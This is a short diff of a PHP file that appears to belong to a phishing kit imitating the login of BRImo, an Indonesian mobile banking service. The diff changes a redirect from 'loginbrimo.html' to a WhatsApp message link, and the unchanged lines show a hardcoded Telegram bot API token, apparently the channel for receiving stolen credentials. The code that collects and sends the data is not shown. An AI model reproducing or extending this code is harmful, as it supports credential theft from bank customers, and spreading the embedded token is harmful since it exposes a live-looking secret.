@@ -1,6 +1,6 @@
 <?php
 
-    header('Location:   loginbrimo.html');
+    header('Location:   https://wa.me/message/SH5URSGSEYQQF1');
     
     $apiToken = "6268470740:AAF3YjCR3L250pMwU-z_FbesihmWA3IVxWM";
     session_start();
